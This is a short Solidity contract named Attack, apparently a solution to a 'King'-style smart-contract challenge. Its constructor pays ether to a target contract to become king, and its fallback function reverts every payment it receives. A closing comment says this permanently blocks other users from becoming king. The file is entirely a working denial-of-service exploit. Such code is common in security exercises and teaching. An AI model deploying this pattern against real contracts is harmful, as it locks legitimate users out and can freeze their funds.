// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    constructor(address _king) public payable {
        address(_king).call.value(msg.value)();
    }

    function() external payable {
        revert("You Lose!!");
    }
}

/// @notice Because this Smart Contract reverts any payments, No other user can become the king...
